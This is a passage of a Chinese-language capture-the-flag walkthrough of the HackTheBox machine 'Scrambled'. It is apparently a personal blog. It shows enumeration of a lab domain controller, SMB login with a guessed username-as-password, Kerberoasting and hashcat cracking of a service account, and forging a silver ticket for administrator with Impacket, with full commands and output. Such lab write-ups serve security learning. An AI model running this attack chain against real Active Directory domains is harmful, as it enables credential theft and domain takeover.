class="string">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span>);                                                                                    </span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                                                                                                       </span><br><span class="line">Device <span class="built_in">type</span>: general purpose                                                   </span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)                                                                                                      </span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10                                                                                      </span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)                                                                                                                                                                                                                                    </span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).                                                                                                     </span><br><span class="line">Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows        </span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-05-05T08:02:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -56s, deviation: 0s, median: -56s</span><br></pre></td></tr></table></figure>
<p>先把<code>scrm.local</code>加到hosts里面<br>smb没出东西<br>ldap：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H <span class="string">&#x27;ldap://10.10.11.168&#x27;</span> -x -s base                                                          </span><br><span class="line"><span class="comment"># extended LDIF                              </span></span><br><span class="line"><span class="comment">#                                        </span></span><br><span class="line"><span class="comment"># LDAPv3                                                                                                 </span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">ldapServiceName: scrm.local:dc1<span class="variable">$@SCRM</span>.LOCAL</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">。。。</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura</span><br><span class="line"> tion,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 290952</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC1,CN=Servers,CN=Default-First-Site-Name,C</span><br><span class="line"> N=Sites,CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">dnsHostName: DC1.scrm.local</span><br><span class="line">defaultNamingContext: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">currentTime: 20250505080737.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=scrm,DC=<span class="built_in">local</span></span><br></pre></td></tr></table></figure>
<p>把<code>dc1.scrm.local</code>也加到hosts里面去<br>然后也没啥</p>
<h3 id="80-web"><a href="#80-web" class="headerlink" title="80 web"></a>80 web</h3><p><img src="/images/scrambled-1.png"><br>index页没啥<br>IT Services倒是有<br><img src="/images/scrambled-2.png"><br>可以都看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># news and alerts</span></span><br><span class="line">04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems <span class="keyword">for</span> some of the programs you use so please be patient <span class="keyword">while</span> we work to resolve any issues</span><br><span class="line">2021年4月9日：由于上个月的安全漏洞，我们现已禁用网络上的所有 NTLM 身份验证。这可能会导致您使用的某些程序出现问题，因此请耐心等待，我们正在努力解决问题。</span><br><span class="line"></span><br><span class="line"><span class="comment"># Contacting IT Support</span></span><br><span class="line">具体见下图示一</span><br><span class="line"></span><br><span class="line"><span class="comment"># New User Account</span></span><br><span class="line">具体见下图示二</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sales Orders App Troubleshooting</span></span><br><span class="line">具体见下图示三</span><br><span class="line"></span><br><span class="line"><span class="comment"># Password Resets</span></span><br><span class="line">Our self service password reset system will be up and running soon but <span class="keyword">in</span> the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.</span><br><span class="line">我们的自助密码重置系统即将上线运行，在此期间，请致电IT支持热线，我们将为您重置密码。如果无人接听，请留言告知您的用户名，我们将重置您的密码，使其与用户名一致。</span><br></pre></td></tr></table></figure>
<p><img src="/images/scrambled-3.png" alt="示一"><br><img src="/images/scrambled-4.png" alt="示二"><br><img src="/images/scrambled-5.png" alt="示三"><br>综上可以得到以下信息<br>    1.系统存在安全漏洞，范围在2021年3月左右<br>    2.有一个用户ksimpson<br>    3.可以注册用户，选项中有administrator<br>    4.4411端口存在一个应用，跟日志有关系应该<br>    5.重置密码的话就会跟用户名一样</p>
<h3 id="ksimpson-user-logon-smb"><a href="#ksimpson-user-logon-smb" class="headerlink" title="ksimpson user logon smb"></a>ksimpson user logon smb</h3><p>那有没有可能ksimpson的用户名和密码都有了，试一下<br>用impacket，nxc也可以，加一个-k，target设置为dc1.scrm.local</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra  </span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br><span class="line"> login &#123;domain/username,passwd&#125; - logs into the current SMB connection, no parameters <span class="keyword">for</span> NULL connection. If no password specified, it<span class="string">&#x27;ll be prompted</span></span><br><span class="line"><span class="string"> kerberos_login &#123;domain/username,passwd&#125; - logs into the current SMB connection using Kerberos. If no password specified, it&#x27;</span>ll be prompted. Use the DNS resolvable domain name</span><br><span class="line"> login_hash &#123;domain/username,lmhash:nthash&#125; - logs into the current SMB connection using the password hashes</span><br><span class="line"> logoff - logs off</span><br><span class="line"> shares - list available shares</span><br><span class="line"> use &#123;sharename&#125; - connect to an specific share</span><br><span class="line"> <span class="built_in">cd</span> &#123;path&#125; - changes the current directory to &#123;path&#125; </span><br><span class="line"> lcd &#123;path&#125; - changes the current <span class="built_in">local</span> directory to &#123;path&#125;</span><br><span class="line"> <span class="built_in">pwd</span> - shows current remote directory</span><br><span class="line"> password - changes the user password, the new password will be prompted <span class="keyword">for</span> input</span><br><span class="line"> <span class="built_in">ls</span> &#123;wildcard&#125; - lists all the files <span class="keyword">in</span> the current directory</span><br><span class="line"> lls &#123;<span class="built_in">dirname</span>&#125; - lists all the files on the <span class="built_in">local</span> filesystem.</span><br><span class="line"> tree &#123;filepath&#125; - recursively lists all files <span class="keyword">in</span> folder and sub folders</span><br><span class="line"> <span class="built_in">rm</span> &#123;file&#125; - removes the selected file</span><br><span class="line"> <span class="built_in">mkdir</span> &#123;<span class="built_in">dirname</span>&#125; - creates the directory under the current path</span><br><span class="line"> <span class="built_in">rmdir</span> &#123;<span class="built_in">dirname</span>&#125; - removes the directory under the current path</span><br><span class="line"> put &#123;filename&#125; - uploads the filename into the current path</span><br><span class="line"> get &#123;filename&#125; - downloads the filename from the current path</span><br><span class="line"> mget &#123;mask&#125; - downloads all files from the current directory matching the provided mask</span><br><span class="line"> <span class="built_in">cat</span> &#123;filename&#125; - reads the filename from the current path</span><br><span class="line"> mount &#123;target,path&#125; - creates a mount point from &#123;path&#125; to &#123;target&#125; (admin required)</span><br><span class="line"> umount &#123;path&#125; - removes the mount point at &#123;path&#125; without deleting the directory (admin required)</span><br><span class="line"> list_snapshots &#123;path&#125; - lists the vss snapshots <span class="keyword">for</span> the specified path</span><br><span class="line"> info - returns NetrServerInfo main results</span><br><span class="line"> <span class="built_in">who</span> - returns the sessions currently connected at the target host (admin required)</span><br><span class="line"> close - closes the current SMB Session</span><br><span class="line"> <span class="built_in">exit</span> - terminates the server process (and this session)</span><br><span class="line"><span class="comment"># shares                                                                                                                                                                                                           </span></span><br><span class="line">ADMIN$                                                                                                                                                                                                             </span><br><span class="line">C$                                                                                                                                                                                                                 </span><br><span class="line">HR                                                                                                                                                                                                                 </span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br></pre></td></tr></table></figure>
<p>枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他共享目录进不去，只有Public</span></span><br><span class="line"><span class="comment"># use Public</span></span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">HR</span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 06:23:19 2021 .</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 06:23:19 2021 ..</span><br><span class="line">-rw-rw-rw-     630106  Sat Nov  6 01:45:07 2021 Network Security Changes.pdf</span><br><span class="line"><span class="comment"># use HR</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use IT</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use NETLOGON</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 ..</span><br><span class="line"><span class="comment"># use Sales</span></span><br><span class="line">[-] SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br><span class="line"><span class="comment"># use SYSVOL</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 ..</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 scrm.local</span><br><span class="line"><span class="comment"># cd scrm.local</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:21:22 2020 .</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:21:22 2020 ..</span><br><span class="line">drw-rw-rw-          0  Mon May  5 15:49:38 2025 DfsrPrivate</span><br><span class="line">drw-rw-rw-          0  Thu Nov  4 05:58:57 2021 Policies</span><br><span class="line">drw-rw-rw-          0  Mon Jan 27 03:14:20 2020 scripts</span><br></pre></td></tr></table></figure>
<p>有一个PDF文件，下载下来看看<br><img src="/images/scrambled-6.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">As you may have heard, our network was recently compromised and an attacker was able to access</span><br><span class="line">all of our data. We have identified the way the attacker was able to gain access and have made some immediate changes. You can find these listed below along with the ways these changes may impact you.</span><br><span class="line">您可能已经听说，我们的网络最近遭到入侵，攻击者成功访问了我们的所有数据。我们已经确定了攻击者获取访问权限的方式，并立即采取了一些措施。您可以在下面找到这些措施以及这些措施可能对您造成的影响。</span><br><span class="line"></span><br><span class="line">Change: As the attacker used something known as <span class="string">&quot;NTLM relaying&quot;</span>, we have disabled NTLM authentication across the entire network.</span><br><span class="line">变更：由于攻击者使用了所谓的“NTLM 中继”，我们已在整个网络中禁用 NTLM 身份验证。</span><br><span class="line"></span><br><span class="line">Workaround: When you <span class="built_in">log</span> on or access network resources you will now be using Kerberos</span><br><span class="line">authentication (<span class="built_in">which</span> is definitely 100% secure and has absolutely no way anyone could exploit it).</span><br><span class="line">This will require you to use the full domain name (scrm.local) with your username and any server</span><br><span class="line">names you access. </span><br><span class="line">解决方法：当您登录或访问网络资源时，您将使用 Kerberos 身份验证（该身份验证绝对 100% 安全，绝对不可能被任何人利用）。</span><br><span class="line">这将要求您在用户名和您访问的任何服务器名称中使用完整的域名 (scrm.local)。</span><br><span class="line"></span><br><span class="line">Change: The attacker was able to retrieve credentials from an SQL database used by our HR software</span><br><span class="line">so we have removed all access to the SQL service <span class="keyword">for</span> everyone apart from network administrators.</span><br><span class="line">Users impacted: HR department</span><br><span class="line">Workaround: If you can no longer access the HR software please contact us and we will manually</span><br><span class="line">grant your account access again.</span><br><span class="line">变更：攻击者能够从我们人力资源软件使用的 SQL 数据库中检索凭据。</span><br><span class="line">因此，我们已移除除网络管理员外所有人对 SQL 服务的访问权限。</span><br><span class="line">受影响用户：人力资源部门</span><br><span class="line">解决方法：如果您无法再访问人力资源软件，请联系我们，我们将手动</span><br><span class="line">重新授予您的帐户访问权限。</span><br></pre></td></tr></table></figure>
<h3 id="kerberoasting-get-sqlsvc-hash"><a href="#kerberoasting-get-sqlsvc-hash" class="headerlink" title="kerberoasting get sqlsvc hash"></a>kerberoasting get sqlsvc hash</h3><p>我们有一个creds了，而系统目前只能进行kerberos认证，可以进行Kerberoasting攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">----------------------------  ------  --------  --------------------------  --------------------------  ----------</span><br><span class="line">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2025-05-05 15:45:37.239329             </span><br><span class="line">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2025-05-05 15:45:37.239329             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*sqlsvc<span class="variable">$SCRM</span>.LOCAL<span class="variable">$scrm</span>.<span class="built_in">local</span>/sqlsvc*$5999b9e80110c8ff442806c201900d38<span class="variable">$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8</span></span><br></pre></td></tr></table></figure>
<p>crack一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -a 0 -m 13100 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt</span><br><span class="line">$krb5tgs$23$*sqlsvc<span class="variable">$SCRM</span>.LOCAL<span class="variable">$scrm</span>.<span class="built_in">local</span>/sqlsvc*$5999b9e80110c8ff442806c201900d38<span class="variable">$2ab656f4463c6f6a1518cd2af5584223a6ac10828a4f0ed0bd9e6e38eee3707ca0da234e4db979c89539740ca6082521039df43cbe1e7d2d836c4cb4f8840681dd11db4350942cdee9bb040e49482929e1b58a894f616b21b971e4fbe5b2a54d296c5caf475240e7a531eb518c0af5b91d94a5ab1e2a2fcbdcc86245bc9c85a9b9bef81e1a0121a2b1ed1dbd912ee23663d91b4046323fbeebe1d29dd507f051eb38a95ae8ec1b8698664ca724aebe5c4c0012d3dff0ca7ba73b9effe3b9c8e76839be65e8922e4884ae674e2c0aa949f33e8f879214abb805534e81de838dacdbbd84b63471b59c06efc4b302b1558f0da68bdea0b2fccdd2ccbbf943788bd1862dfbd702e9f4f69d6d2f7f22a621cbc3fbf310b376111c6eb149c97730a2270bd29a3e5d1b47517bd4d360264298366815c23a0fda438e3b4acbb3943ab101225cc07375104e64f9e899724a54526df04c786191dddcf243aa9bf167a589fee1e6ab0b86a4501e7ed317724d82e1abfc15083bfb5656adfd837749dc7ab7ee5b6ac7e3b8002fc78accedd26ebeea6df978d056bbc67a0d7363656a9a542e76385c8ae0f931e03314c92c966faac59be49f90f4576e0a76ae260db6d20f0174b95ee94cd67bcf46a511f0f67d14e2c53601964a886edbe34d1700462944e71234735eed6506880204379c9f137cce758532c4861a2c75d9ec376133d84944c60d68eb767cd5b0bb0abc86326f6b549f54009173898ce9e9de93fdf315376f58258d8b8f44b900d188b098cdf7b3ae4e3689abe02580afa086a1044b1373899a6578cfd35de299bf8562bf0ac74550663d260c79baca36c68b14b6fd9ea910d6e52c3414e88aa63c8e5cf7f88edf54673ee56a789b2b8a38e1fa0a62982a3273c35c5a31728e8a31e6be00e5c89d51476766b74da7bf822d46394e223c7d936308658029ebcfcb487ad2f28050d4d1c7384efe036e7be3f2c94c985fcc4f05998379aefb8e176f5cc75e2cda2d0455373b0f5d4d50b4a1956ceef8705332bff82aade8be270877fd5e4eb11d76cf2a5aa249b5533915d2c6f66aba8ca9932f4090476dde1b51c1c96367fc03e072f29bb4ada026dc0d373fa1784ab21c1bf73860c9fb7838f56c3ed98f1e95390ba43ea1c914aaa61e6bbb3dcd7446f9f5d647fb2bfb99a807d559fd4d01a1a47c8b54afea90af289b7ad2a071c214ca5bc5c76d80c93d3e9ec5172259a032251e0d140d82d9fe0b8999f6e8d412b12f989a1cdbaa0f4963933fe4ac0d7081498a6f576083fe4df1563f24dbbaf03bdeadbacc18b083639d86940e038c2a040ed329b8663e8f3952c13ec8e76abdc836604ca5049a17adce47964e66592a3e27632f0b947d283b14fde5de56fb01ebc74b85f5066d941a88a4111c0b58be0d2f8b17625b4ee80b0c544923daf6a8</span>:Pegasus60</span><br></pre></td></tr></table></figure>
<p>这样就得到一个<code>sqlsvc:Pegasus60</code>，但是我们也不可以ntlm，得弄到他的hash<br>通过一个在线工具（Google一下ntlm hash generator），这里用<a target="_blank" rel="noopener" href="https://www.browserling.com/tools/ntlm-hash">Ntlm hash</a><br><img src="/images/scrambled-7.png"><br>虽然有mssql端口打开，但是尝试未果<br>有了hash，尝试搞一张银票<br>要搞银票需要拿到SID（powerview也可以拿到sid）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ getPac.py scrm.local/sqlsvc -targetUser administrator -hashes <span class="string">&quot;:B999A16500B87D17EC7F2E2A68778F05&quot;</span></span><br><span class="line">Domain SID: S-1-5-21-2743207045-1827831105-2542523200</span><br></pre></td></tr></table></figure>
<p>然后开始制作银票</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain dc1.scrm.local -dc-ip 10.10.11.168 -spn MSSQLSvc/dc1.scrm.local:1433 administrator</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">/usr/bin/ticketer.py:129: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  aTime = timegm(datetime.datetime.utcnow().timetuple())</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> dc1.scrm.local/administrator</span><br><span class="line">/usr/bin/ticketer.py:480: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;authtime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/bin/ticketer.py:481: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encTicketPart[<span class="string">&#x27;starttime&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">/usr/bin/ticketer.py:483: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">/usr/bin/ticketer.py:606: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class="keyword">for</span> removal <span class="keyword">in</span> a future version. Use timezone-aware objects to represent datetimes <span class="keyword">in</span> UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  encRepPart[<span class="string">&#x27;last-req&#x27;</span>][0][<span class="string">&#x27;lr-value&#x27;</span>] = KerberosTime.to_asn1(datetime.datetime.utcnow())</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final 